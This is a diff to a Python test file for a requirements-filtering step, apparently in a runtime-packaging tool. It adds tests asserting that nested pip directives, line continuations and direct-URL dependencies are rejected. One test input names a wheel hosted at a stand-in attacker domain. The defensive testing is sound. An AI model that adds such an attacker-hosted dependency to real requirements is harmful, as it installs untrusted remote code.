@@ -58,7 +58,26 @@ def test_unsafe_runtime_requirement_forms_are_rejected(
     )
 
     assert result.returncode != 0
-    assert "runtime requirement must not use" in result.stderr
+    assert not filtered.exists()
+
+
+@pytest.mark.parametrize(
+    "requirements",
+    [
+        "-r nested.txt\nmolecules-workspace-runtime>=0.3.11\n",
+        "molecules-workspace-runtime>=0.3.11 \\\n<1\n",
+        (
+            "molecules-workspace-runtime>=0.3.11\n"
+            "other-package @ https://attacker.example/other.whl\n"
+        ),
+    ],
+)
+def test_pip_directives_continuations_and_direct_urls_are_rejected(
+    tmp_path: Path, requirements: str
+) -> None:
+    result, filtered = _prepare_requirements(tmp_path, requirements)
+
+    assert result.returncode != 0
     assert not filtered.exists()
 
 
